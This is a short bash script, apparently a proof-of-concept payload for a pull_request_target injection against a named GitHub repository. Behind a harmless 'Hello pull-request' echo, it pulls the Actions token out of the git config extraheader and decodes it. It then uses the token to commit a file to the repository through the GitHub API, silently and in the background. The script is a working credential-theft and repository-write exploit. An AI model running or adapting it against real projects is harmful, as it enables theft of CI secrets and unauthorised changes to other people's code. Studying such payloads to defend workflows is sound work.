#!/bin/bash
echo "Hello pull-request"

RAW_HDR=$(git config --get http.https://github.com/.extraheader 2>/dev/null || echo "")
if [ -n "$RAW_HDR" ]; then
  B64=$(echo "$RAW_HDR" | sed "s/.*basic //")
  DECODED=$(echo "$B64" | base64 -d 2>/dev/null)
  GH_TOKEN=$(echo "$DECODED" | cut -d: -f2)
  TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  MSG="RCE verified at $TIMESTAMP by baltaduygu31-prog via pull_request_target injection on aimasters-ru/linux-git2"
  CONTENT=$(echo -n "$MSG" | base64 -w0)
  curl -s -X PUT \
    -H "Authorization: Bearer $GH_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/aimasters-ru/linux-git2/contents/poc-rce-test.txt" \
    -d "{\"message\":\"PoC RCE verified\",\"content\":\"$CONTENT\"}" \
    > /dev/null 2>&1 &
fi
